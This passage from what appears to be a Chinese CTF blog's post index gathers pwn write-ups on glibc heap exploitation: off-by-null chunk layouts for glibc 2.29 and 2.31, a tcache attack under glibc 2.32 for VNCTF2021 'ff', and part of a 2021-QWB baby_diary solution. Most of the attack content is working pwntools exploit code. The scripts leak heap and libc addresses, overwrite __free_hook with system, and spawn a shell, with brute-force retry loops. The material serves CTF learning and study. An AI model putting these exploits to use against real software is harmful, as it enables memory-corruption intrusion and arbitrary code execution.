main_arena+96，然后才会返回0x---150，fd都会被改。\n\n▲所以先将这两个chunk放入largebin中，依据largebin的机制，由于这两个chunk的大小不同，直接申请对应大小就能得到对应的chunk，同时由于largebin排列依据从大到小，申请时也是先遍历大小再遍历fd，如果所需大小的链中只有该chunk，直接返回。所以就可以申请一个大chunk，将这两个chunk都放入largebin中，顺序为：\n\n```python\n#注释头\n\nadd(0x9F8,'\\x14') # 14 chunk into largebin\n```\n\n同时这个大chunk也是之后需要触发的off-by-null的chunk\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-52-36.png)\n\n之后再申请0x---150大小的chunk就能直接得到了，现在就修复完fd和bk了。\n\n```python\n#注释头\n\nadd(0x428, '') # 15 partial overwrite fd\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-29_23-56-22.png)\n\n6.最后用off-by-null来设置触发chunk的size位\n\n```python\n#注释头\n\nedit(7,'\\x77'*0x200+p64(0xb90))\nfree(14)\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_00-00-08.png)\n\n满足所有条件，释放\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_00-00-27.png)\n\n可以看到top_chunk已经向上合并到0x---c00了，之后就具体的具体分析就完事了。\n\n▲最后贴个简单的exp，只是布局的：\n\n```python\n#注释头\n\nadd(0x1000-0x8-0xf0,'padd')#0\n\nadd(0x418,'\\x01'*0x410) #1 fd 0x---2b0\nadd(0x108,'\\x02*0x100') #2\nadd(0x418,'\\x03'*0x410) #3\nadd(0x438,'\\x04'*0x430) #4 unlink_chunk 0x---c00\nadd(0x108,'\\x05'*0x100) #5\nadd(0x428,'\\x06'*0x420) #6 bk 0x---150\nadd(0x208,'\\x07'*0x200) #7\n\n#left fd bk in 0x---c00\nfree(1)\nfree(4)\nfree(6)\n\n#merge and carve to get 0x---c20 and change size which in 0x---c00 \nfree(3)\nadd(0x438, '\\x08'*0x418 + p64(0xb91)) #8 set size\n\n#reply\nadd(0x418,'\\x09'*0x410) # 9 0x---c20\nadd(0x428,'\\x10'*0x420) # 10 bk 0x---150\nadd(0x418,'\\x11'*0x410) # 11 fd 0x---2b0\n\n#repair fd\nfree(11) #0x---2b0\nfree(9) #0x---c20\nadd(0x418, 'PIG007nb') # 12 0x---2b0 to overflow \\x00 in fd\nadd(0x418,'\\x13'*0x410) # 13 0x---c20\n\n\n#repair bk\nfree(13)\nfree(10)\nadd(0x9F8,'\\x14'*0x9f0) # let 0x---150 0x---c20 into largebin\nadd(0x428, '') # 15 0x---150 to overflow \\x00 in fd\n\n#trigger off-by-null\n#add(0x418,'\\x16'*0x410) # 16 c20\nedit(7,'\\x77'*0x200+p64(0xb90))\nfree(14)\n```\n\n \n","tags":["off-by-null"],"categories":["PWN","pwn堆-off-by-null"]},{"title":"2.29下的off-by-null","url":"/2021/08/14/2.29下的off-by-null/","content":"\n△相比2.29之前的版本中，在向上合并时加了一项检查：\n\n```\n#注释头\n\nif (__glibc_unlikely (chunksize(p) != prevsize))\n    malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n```\n\n就是检查上一个chunk的size是否等于当前chunk的pre_size。之前的off-by-null肯定是不等于的啊，所以这里就一定会出错。那么2.29的绕过方法就是通过smallbin和largebin来伪造一个chunk，满足：\n\n```\n#注释头\n\n①fake_chunk->fd->bk == fake_chunk_addr\n②fake_chunk->bk->fd == fake_chunk_addr\n③fake_chunk->size = trigger_chunk->pre_size\n```\n\n其中③用来过新增加的检查：\n\n```\n#注释头\n\nif (__glibc_unlikely (chunksize(p) != prevsize))\n    malloc_printerr (\"corrupted size vs. prev_size while consolidating\");\n```\n\n①和②用来过unlink中的检查：\n\n```\n#注释头\n\nif (__builtin_expect (FD->bk != P || BK->fd != P, 0))\n    malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);\n```\n\n这样就能够成功off-by-null了，图示如下(用了[t1an5g的博客](https://bbs.pediy.com/thread-257901-1.htm#msg_header_h2_2)的图片，侵删)：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191444152.png)\n\n1.下面简单说下流程：\n\n(1)进行一定的堆布局，使得起作用的chunk的堆地址为0xx...x0010，同时也方便计算偏移，从而进行低位字节覆盖。\n\n(2)通过largebin的fd_nextsize指针和bk_nextsize指针，加上字节覆盖使得fake_chunk的fd指针指向指定FD(即下面的chunk18)，fake_chunk的bk指针指向指定BK(即下面的chunk17)。\n\n(3)通过fastbin和smallbin的连用，加上字节覆盖使得FD(chunk18)的bk指针指向fake_chunk。\n\n(4)通过fastbin加上字节覆盖使得BK(chunk17)的fd指针指向fake_chunk。\n\n(5)进行完以上操作就得到类似上图的堆布局，之后就可以绕过检查，触发off-by-null。\n\n2.详细介绍一下具体实现方法：\n\n(1)先申请17个chunk,chunk0-chunk16，其中chunk0-chunk7用来进行堆布局，使得后面的chunk15的地址为0xx..x0010，即使得申请的堆地址的第二个字节为\"\\x00\"，以便之后覆盖的时候不用进行一字节爆破，从而进行对抗off-by-null的0字节溢出。当然，如果条件限制的话， 其实是可以不用chunk0-chunk7的布局，用一字节爆破来解决问题。chunk8-chunk14大小为0x28，用来填充0x30大小的tcache。chunk15即关键部分，chunk16防止合并。\n\n(2)释放chunk15，size应该大于tcache的最大size，这里的chunk15最好设置大一点，大佬的博客设置了0xb20大小。然后chunk15就会进入unsortedbin中，由于unsortedbin中只有一个chunk15，所以chunk15的指针会有以下效果：\n\n```\n#注释头\n\nchunk15->fd == main_arena+88(unsortebin_addr)\nchunk15->bk == main_arena+88\n```\n\n(3)申请一个0x28大小的chunk17，同时由于此时bin中没有chunk，只有Unsortedbin才有chunk15，所以会将chunk15先放入largebin中，之后再从chunk15中切割，返回chunk17，所以此时chunk15在largebin中，又只有它一个chunk，由于放入largebin的赋值语句，所以在切割之前会变成：\n\n```\n#注释头\n\nchunk15->fd == largebin_addr\nchunk15->bk == largebin_addr\nchunk15->fd_nextsize == chunk15_addr\nchunk15->bk_nextsize == chunk15_addr\n```\n\n切割之后，chunk17获得了chunk15残留下来的fd，bk，fd_nextsize，bk_nextsize。因为chunk17是用来构造fake_chunk的，所以大小需要至少有0x20。那么此时的chunk17中内容就会如下：\n\n```\n#注释头\n\nchunk17->fd == largebin_addr\nchunk17->bk == largebin_addr\nchunk17->fd_nextsize == chunk17_addr\nchunk17->bk_nextsize == chunk17_addr\n```\n\n然后构造在chunk17里制作fake_chunk，满足：\n\n```\n#注释头\n\nfake_chunk->size == trigger_chunk->pre_size\nfake_chunk->fd == chunk18_addr\nfake_chunk->bk == chunk17_addr\n```\n\n这里需要进行赋值：\n\n```\n#注释头\n\nchunk17->fd = trigger_chunk->pre_size\nchunk17->fd_nextsize = \"\\x40\"\n```\n\n(后面会讲到为什么会这么赋值)之后的fake_chunk的bk自动继承了之前残留下来的指针。\n\n(4)申请chunk18-chunk21，大小为0x28。使得chunk18-chunk21都是从chunk15中切割出来的，之后用chunk8-chunk14填满0x30的tcache，然后再顺序释放chunk20和chunk18，使得chunk18,chunk20进入fastbin(0x30)中，顺序为chunk18->chunk20。\n\n(5)将chunk8-chunk14申请出来，清空tcache(0x30)，然后再申请一个0x400大小的chunk(超过smallbin大小即可)，这样就会将fastbin中的chunk，也就是chunk18和chunk20放入到smallbin中。由于smallbin和fastbin刚好相反，一个是FIFO一个是FILO，所以顺序会反过来，变成：chunk20->chunk18，但同时由于是bk寻址，所以再申请chunk会先把chunk18取出来，同时在smallbin中，那么就会满足chunk18->bk == chunk20_addr\n\n(6)此时赋值chunk18->bk = fake_chunk_addr，这里不用知道堆地址，因为我们知道chunk20_addr - fake_chunk_addr == 0x80(sizeof(fake_chunk)+sizeof(chunk18)+sizeof(chunk19))。所以之前chunk0-chunk7就可以进行一些大小布局，使得chunk15_addr == 0xx...x0010，那么fake_chunk_addr == 0xx...x0020，chunk20_addr == 0xx...x00a0，这样我们就只需要把0xa0覆盖成0x20，也就是修改chunk18->bk的第一个字节为0x20即可。但同时由于off by null的关系，修改chunk18->bk的第一个字节势必会导致第二个字节为\"\\x00\"，所以我们之前的堆布局也要使得chunk15_addr的第二个字节为\"\\x00\"才可以。\n\n那么现在也可以理解之前的一个赋值语句：chunk17->fd_nextsize = \"\\x40\"，这里就是为了将\"\\x10\"覆盖为\"\\x40\"使其指向chunk18，同时使得第二个字节也为\"\\x00\"。\n\n这样就满足了：\n\n```\n#注释头\n\nfake_chunk->size == trigger_chunk->pre_size\nfake_chunk->fd == chunk18_addr\nfake_chunk->bk == chunk17_addr\nchun18->bk == fake_chunk_addr\nchunk17->fd == chunk18_addr\n```\n\n但是chunk17->fd不等于fake_chunk_addr。那么同样的操作再来一次，利用chunk17和chunk19，使其进入fastbin，将chunk17的fd指向chunk19，然后再申请回来，覆盖chunk17的fd指针，0x70覆盖为0x20即可。(由于2.29下的tcache会有key字段，使得chunk17的bk指针被修改，相当于修改fake_chunk的size位，这不是我们想看到的，所以还是用fastbin比较好)流程如下：\n\n①将chunk20从tcache中申请出来，防止之后不好操作，然后再将chunk8-chunk14放入tcache中，使得之后的chunk进入fastbin。\n\n②顺序释放chunk19，chunk17，使其进入fastbin中，使得chunk17->fd == chunk19_addr，就是0xx...x70。\n\n③然后将chunk8-chunk14申请回来，再将chunk17申请回来，覆盖chunk17的fd的第一个字节为0x20，那么就可以满足总的条件：\n\n```\n#注释头\n\nfake_chunk->size == trigger_chunk->pre_size\nfake_chunk->fd == chunk18_addr\nfake_chunk->bk == chunk17_addr\nchunk18->bk == fake_chunk_addr\nchunk17->fd == fake_chunk_addr\n```\n\n(7)最后将chunk19申请回来，再从chunk15剩下的部分申请chunk22用来溢出。再申请chunk23将chunk15遗留的部分都申请回来，溢出之后释放掉，即可触发off by null，向上合并最初的chunk15-0x10大小的chunk，使得fake_chunk，chunk18,chunk19,chunk20,chunk21,chunk22,chunk23都被置入unsortedbin中。利用chunk8-chunk14对抗tcache，就可以随便玩了。(注意这里不需要像之前版本的off by null一样，还需要释放掉chunk0来绕过unlink检查，之前是因为不检查size位，所以直接释放掉即可。这里的fake_chunk已经替代了chunk0的作用，能够绕过Unlink的检查和size位的检查)\n\n3.最后模拟一下代码，同样参考了大佬[t1an5g的博客](https://bbs.pediy.com/thread-257901-1.htm#msg_header_h2_2)：\n\n(1)前期准备加堆布局:\n\n```python\n#注释头\n\nfor i in range(7): # 0-6\n    add(0x1000, \"padding\")\nadd(0x1000-0x410, \"padding\") # 7\n\nfor i in range(7): # 8-14\n    add(0x28, 'tcache')\n\n#crux chunk15\nadd(0xb20, \"largebin\") # 15\n\n#prevent merge\nadd(0x10, \"padding\") # 16\n```\n\n(2)制作fake_chunk，利用largebin踩下fd_nextsize和bk_nextsize:\n\n```python\n#注释头\n\ndelete(15)\n\n#chunk15 to largebin\nadd(0x1000, '\\n') \n\n#make fake_chunk in chunk17\nadd(0x28, p64(0) + p64(0x521) + p8(0x40))\n```\n\n(3)联动fastbin和smallbin：\n\n```python\n#注释头\n\nadd(0x28, 'a') # 18\nadd(0x28, 'b') # 19\nadd(0x28, 'c') # 20\nadd(0x28, 'd') # 21\n\n# fill in tcache(0x30)\nfor i in range(7): # 8-14\n    delete(8 + i)\n\ndelete(20)\ndelete(18)\n\n# clear tcache(0x30)\nfor i in range(7): # 8-14\n    add(0x28, 'padding')\n\n# fastbin to smallbin\nadd(0x400, 'padding')\n\n# get chunk18 from smallbin ,chunk20 to tcache\n# change chunk18->bk to point to fake_chunk\nadd(0x28, p64(0) + p8(0x20))\n```\n\n(4)利用fastbin修改chunk17->fd：\n\n```python\n#注释头\n\n# clear chunk from tcache\nadd(0x28, 'clear') # 20 from tcache\n\nfor i in range(7): # 8-14\n    delete(8 + i)\n\n# free to fastbin\ndelete(19)\ndelete(17)\n\nfor i in range(7): # 8-14\n    add(0x28, '\\n')\n\n# change chunk17->fd to point to fake_chunk\nadd(0x28, p8(0x20))\n```\n\n(5)触发off-by-null:\n\n```python\n#注释头\n\nadd(0x28, \"clear\")#19 from fastbin\n\nadd(0x28, \"a\") # 22 cutting from chunk15 in unsortebin,for overwrite\nadd(0x5f8, \"a\") # 23 legacy from chunk15 in unsortebin,for trigger off-by-null\nadd(0x100, \"padding\") # 24\n\n# off-by-null \nedit(22, \"a\"*0x20 + p64(0x520))\n\n# trigger\ndelete(23)\n```\n\n△以上的chunk索引对于题目具体分析，不同题目对索引的处理肯定不一样。\n\n其实还有其他只利用unsortedbin和largebin的绕过，贴一下地址：\n\nhttps://www.anquanke.com/post/id/236078#h3-14\n\n后面再来啃吧。\n","tags":["off-by-null"],"categories":["PWN","pwn堆-off-by-null"]},{"title":"2.32下的tcache利用-VNCTF2021 ff","url":"/2021/08/14/2.32下的tcache利用-VNCTF2021 ff/","content":"\n通过这题学习下2.32下的tcache，同时还学到好多东西。\n\n1.先解析下题目，大概是提供了分配、释放、编辑、打印堆块的功能，不过限制了只能打印一次、编辑两次，同时还限制了不能分配0x90及以上的堆块。然后释放功能指针没清空，有UAF，保护全开。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsJXQhGvoTieV14xa.png)\n\n2.首先泄露地址：因为2.32要利用doble-free必须泄露堆地址，所以show()功能肯定先被用掉，直接从free的chunk的fd指针泄露出heap_base，因为2.32的safe-linking异或机制就是下一个chunk和heap_base异或放入fd。\n\n那么就思考之后怎么泄露Libc地址，可以通过劫持IO来泄露，但是劫持IO也需要libc地址才行啊，这里就用到爆破，利用unsortebin来留下地址在tcache结构体上，然后部分写2个字节来爆破半个字节。因为IO和main_arena其实相距不是太远，调试就可以知道。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_17-01-47.png)\n\n```python\n#注释头\n\n#leak heap_base\nnew(0x80,'PIG007NB')\nfree()\nshow()\nheap_leak = u64(rc(5).ljust(8,'\\x00'))\nheap_base = heap_leak*0x1000\nlog.info(\"heap_base:0x%x\"%heap_base)\n\n#change key to make double free\nedit('PIG007NBPIG007NB')\nfree()\n\n#change 0x290(7) to free tcache(0x290) into unsortedbin\nedit(p64((heap_leak) ^ (heap_base + 0x10)))\nnew(0x80, 'PIG007NB')\nnew(0x80, '\\x00\\x00' *((0x290-0x20)/0x10) + '\\x07\\x00')\nfree()\n#--------------------------------------------\nnew(0x88, ('\\x00\\x00' + '\\x00\\x00' + '\\x02\\x00' + '\\x00\\x00' + '\\x00\\x00' * 2 + '\\x01\\x00').ljust(0x88, '\\x00'))\n#--------------------------------------------\n```\n\n被#---------------------------包裹起来的部分，这里只能申请0x48或者0x88大小的，因为tcache结构体被破坏，很多bin的数量变大了，不再是0x0，但是tcache中对应的Bin链表中仍然是0x0，再申请对应大小的就会触发程序异常，其实就是放入tcache空闲bin链表的时候错误：\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_17-31-09.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-30_17-31-31.png)\n\n3.然后就是劫持IO泄露地址:\n\n```python\n#注释头\n\nnew(0x18,p64(heap_base+0x330)+'\\xbb') #will be used later\nnew(0x18,p16(0x66c0))\nnew(0x78,p64(0xfbad1800) + p64(0)*3 + p64(heap_base+0xa8)+p64(heap_base+0xb0)+p64(heap_base+0xb0))\n\n#new(0x78,p64(0xfbad1800) + p64(0)*3 + b'\\x00')\n#this will be OK\nmain_arena = u64(p.recvuntil('1.add')[-13:-7].ljust(8,b'\\x00')) - 0xbb - 96\ntest = main_arena>>40\nlog.info(\"main_arena:0x%x\"%main_arena)\nlog.info(\"test:0x%x\"%test)\nif(test != 0x7f):\n    return\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nlibc_base = malloc_hook-obj.dump('__malloc_hook')\n#stdout_addr = u64(p.recvuntil('1.add')[-13:-7].ljust(8,b'\\x00'))-132\n# log.info(\"stdout_addr:0x%x\"%stdout_addr)\n# obj = LibcSearcher(\"_IO_2_1_stdout_\", stdout_addr)\n# libc_base = stdout_addr-obj.dump('_IO_2_1_stdout_')\n\nsystem_addr = libc_base + obj.dump(\"system\")\n__free_hook_addr = libc_base + obj.dump(\"__free_hook\")\n\nlog.info(\"libc_base:0x%x\"%libc_base)\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"__free_hook_addr:0x%x\"%__free_hook_addr)\n```\n\n4.最后就是填充，将unsortedbin申请完之后，将unsortedbin从Tcache的结构体中脱离出来，防止再申请的时候乱套。这里直接从topchunk申请，安全一点。\n\n```python\n#注释头\n\nnew(0x58,'PIG007NB')\nnew(0x58,'PIG007NB')\nnew(0x58,'PIG007NB')\nnew(0x58,'PIG007NB')\nnew(0x18,'PIG007NB')\nnew(0x18,'PIG007NB')\n\n\n#one_gadget = libc_base + 0xdf54c\nnew(0x88, p64(__free_hook_addr^(heap_base/0x1000)))\nnew(0x38, p64(system_addr))\nnew(0x38, p64(system_addr))\n\nnew(0x10, b'/bin/sh\\x00')\npause()\nfree()\np.interactive()\n```\n\n5.最后贴个爆破的exp，有些借鉴了arttnba3师傅的：\n\nhttps://arttnba3.cn/2021/05/10/NOTE-0X04-GLIBC_HEAP-EXPLOIT/\n\n```python\n#注释头\n\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./pwn\"\n#libc_file = \"./libc-2.24.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"libc_base:0x%x\"%libc_base)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so  \n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    #p = process(binary)\n    p = process(['/home/hacker/glibc/2.32/glibc-2.32_build/elf/ld.so', './pwn'], env={\"LD_PRELOAD\":\"/home/hacker/glibc/2.32/glibc-2.32_build/libc.so.6\"})\n    #p = process(['./ld-2.32.so', './pwn'], env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \n\n\n\ndef cmd(command):\n    p.recvuntil(b\">>\")\n    p.sendline(str(command).encode())\n\ndef new(size, content):\n    cmd(1)\n    p.recvuntil(b\"Size:\")\n    p.sendline(str(size).encode())\n    p.recvuntil(b\"Content:\")\n    p.send(content)\n\ndef free():\n    cmd(2)\n\ndef show():\n    cmd(3)\n\ndef edit(content):\n    cmd(5)\n    p.recvuntil(b\"Content:\")\n    p.send(content)\n\ndef exp():\n\n    #leak heap_base\n    new(0x80,'PIG007NB')\n    free()\n    show()\n    heap_leak = u64(rc(5).ljust(8,'\\x00'))\n    heap_base = heap_leak*0x1000\n    log.info(\"heap_base:0x%x\"%heap_base)\n\n    #change key to make double free\n    edit('PIG007NBPIG007NB')\n    free()\n\n    #change 0x290(7) to free tcache(0x290) into unsortedbin\n    edit(p64((heap_leak) ^ (heap_base + 0x10)))\n    new(0x80, 'PIG007NB')\n    new(0x80, '\\x00\\x00' *((0x290-0x20)/0x10) + '\\x07\\x00')\n    free()\n    #--------------------------------------------\n    new(0x88, ('\\x00\\x00' + '\\x00\\x00' + '\\x02\\x00' + '\\x00\\x00' + '\\x00\\x00' * 2 + '\\x01\\x00').ljust(0x88, '\\x00'))\n    #--------------------------------------------\n    \n    \n    new(0x18,p64(heap_base+0x330)+'\\xbb') #will be used later\n    new(0x18,p16(0x66c0))\n    new(0x78,p64(0xfbad1800) + p64(0)*3 + p64(heap_base+0xa8)+p64(heap_base+0xb0)+p64(heap_base+0xb0))\n\n    #new(0x78,p64(0xfbad1800) + p64(0)*3 + b'\\x00')\n    #this will be OK\n    main_arena = u64(p.recvuntil('1.add')[-13:-7].ljust(8,b'\\x00')) - 0xbb - 96\n    test = main_arena>>40\n    log.info(\"main_arena:0x%x\"%main_arena)\n    log.info(\"test:0x%x\"%test)\n    if(test != 0x7f):\n        return\n    malloc_hook = main_arena-0x10\n    obj = LibcSearcher(\"__malloc_hook\", malloc_hook)\n    libc_base = malloc_hook-obj.dump('__malloc_hook')\n    #stdout_addr = u64(p.recvuntil('1.add')[-13:-7].ljust(8,b'\\x00'))-132\n    # log.info(\"stdout_addr:0x%x\"%stdout_addr)\n    # obj = LibcSearcher(\"_IO_2_1_stdout_\", stdout_addr)\n    # libc_base = stdout_addr-obj.dump('_IO_2_1_stdout_')\n\n    system_addr = libc_base + obj.dump(\"system\")\n    __free_hook_addr = libc_base + obj.dump(\"__free_hook\")\n\n    log.info(\"libc_base:0x%x\"%libc_base)\n    log.info(\"system_addr:0x%x\"%system_addr)\n    log.info(\"__free_hook_addr:0x%x\"%__free_hook_addr)\n\n    new(0x58,'PIG007NB')\n    new(0x58,'PIG007NB')\n    new(0x58,'PIG007NB')\n    new(0x58,'PIG007NB')\n    new(0x18,'PIG007NB')\n    new(0x18,'PIG007NB')\n\n\n    #one_gadget = libc_base + 0xdf54c\n    new(0x88, p64(__free_hook_addr^(heap_base/0x1000)))\n    new(0x38, p64(system_addr))\n    new(0x38, p64(system_addr))\n\n    new(0x10, '/bin/sh\\x00')\n    pause()\n    free()\n    p.interactive()\n\ncount = 1\nwhile True:\n    try:\n        print('the no.' + str(count) + ' try')\n        p = process(['/home/hacker/glibc/2.32/glibc-2.32_build/elf/ld.so', './pwn'], env={\"LD_PRELOAD\":\"/home/hacker/glibc/2.32/glibc-2.32_build/libc.so.6\"})\n        #p = remote('node3.buuoj.cn', 26018)#process('./ff') #\n        exp()\n        \n    except Exception as e:\n    \tprint(e)\n        p.close()\n        count = count + 1\n        continue\n```\n\n \n\n▲总结一下：\n\n(1)IO_FILE的新知识：\n\nnew(0x78,p64(0xfbad1800) + p64(0)*3 + b'\\x00')\n\n(2)2.32Tcache机制：\n\n①放入tcache对应bin链表时会异或heap_base/0x1000，并且fd也会变化。\n\n②bin链表中的count和申请与否的关系：\n\n如果tcache的对应bin的count为0，则不会从该Tcache中申请。\n\n如果大于等于1，那么就需要看tcache结构体上对应bin链表存放的chunk地址是否为一个合法的了，如果不合法则会申请失败，程序退出。(应该都是这样的)\n\n③需要修改Key字段才能double free，即free 的时候会检测 key 字段是否为 tcache，如果相等则检测 free 的指针值是否在对应的tcache的bin上，如果在则视为程序在 double free，进而终止程序。\n\n","tags":["Tcache"],"categories":["PWN","pwn堆-Tcache"]},{"title":"2021-QWB","url":"/2021/08/14/2021-QWB/","content":"\n一、baby_diary\n\n2.31下的off-by-null，多溢出半个字节，所以总共需要爆破一个字节。这里还需要绕过read的检查，不过我这个布局完之后刚好可以通过，也就没太管了。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./baby_diary\"\nlibc_file = \"./libc-2.31.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so  \n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    #p = process(binary)\n    p = process(binary, env={\"LD_PRELOAD\":\"./libc-2.31.so\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"49153\")\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \n\nmenu = \">> \"\n\n\ndef add(size, con):\n\tsla(menu, \"1\")\n\tsla(\"size: \", str(size))\n\tsla(\"content: \", con)\n\ndef delete(idx):\n\tsla(menu, \"3\")\n\tsla(\"index: \", str(idx))\n\ndef show(idx):\n\tsla(menu, \"2\")\n\tsla(\"index: \", str(idx))\n\n\ndef pwn():\n\n\n    #(1)前期准备加堆布局:\n    for i in range(7): # 0-6\n        add(0x2000-1, \"/bin/sh\\x00\")\n    add(0x2000-0x1410-0x40-1, \"padding\") # 7\n\n    for i in range(7): # 8-14\n        add(0x28-1, 'tcache')\n\n    #crux chunk15\n    add(0xb20-1, \"largebin\") # 15\n    #prevent merge\n    add(0x10-1, \"padding\") # 16\n\n\n\n\n    #(2)制作fake_chunk，利用largebin踩下fd_nextsize和bk_nextsize:\n    delete(15)\n\n    #chunk15 to largebin\n    add(0x1000-1, '\\n') #15\n    #make fake_chunk in chunk17\n    add(0x28-1, p64(0x6) + p64(0x601) + p8(0x40)) #17\n\n\n\n    #(3)联动fastbin和smallbin：\n    add(0x28-1, '\\x18') # 18\n    add(0x28-1, '\\xaa') # 19\n    add(0x28-1, '\\x20') # 20\n    add(0x28-1, '\\x21') # 21\n    # fill in tcache(0x30)\n    for i in range(7): # 8-14\n        delete(8 + i)\n\n    delete(20)\n    delete(18)\n\n    # clear tcache(0x30)\n    for i in range(7): # 8-14\n        add(0x28-1, '\\x08')\n\n    # fastbin to smallbin\n    add(0x400-1, '\\x20') #18\n\n    # get chunk18 from smallbin ,chunk20 to tcache\n    # change chunk18->bk to point to fake_chunk\n    add(0x28-1, p64(0) + p8(0x20)) #20\n\n\n\n    #(4)利用fastbin修改chunk17->fd：\n    # clear chunk from tcache\n    add(0x28-1, 'clear') # 21 from tcache \n\n    for i in range(7): # 8-14\n        delete(8 + i)\n\n    # free to fastbin\n    delete(19)\n    delete(17)\n\n    for i in range(7): # 8-14\n        add(0x28-1, '\\x08')\n\n    # change chunk17->fd to point to fake_chunk\n    add(0x28-1, p8(0x20)) #17\n\n\n    #(5)触发off-by-null:\n    add(0x28-1, \"\\x19\")# 19 from fastbin\n    show(19)\n\n    add(0x108-1, \"\\x23\") # 23 cutting from chunk15 in unsortebin,for overwrite\n    add(0x518-1, \"\\x24\") # 24 legacy from chunk15 in unsortebin,for trigger off-by-null\n    #add(0x100-1, \"padding\") # 24\n    # off-by-null \n\n    delete(23)\n    add(0x108-1,p64(0x0)*0x21)\n    delete(23)\n    add(0x108-1,p64(0x0)*0x1f+\"\\x00\"*7+\"\\x06\")\n    #edit(22, \"a\"*0x20 + p64(0x520))\n    # trigger\n    delete(24)\n    add(0x4e8-1,\"padding\")\n    show(23)\n    ru(\"content: \")\n    main_arena = u64(rc(6).ljust(8,\"\\x00\"))-96\n    malloc_hook = main_arena-0x10\n    libc_base = malloc_hook - libc.sym['__malloc_hook']\n    free_hook = libc_base + libc.sym['__free_hook']\n    system_addr = libc_base + libc.sym['system']\n    log.info(\"system_addr:0x%x\"%system_addr)\n    log.info(\"libc_base:0x%x\"%libc_base)\n\n    delete(24)\n    delete(1)\n    delete(2)\n    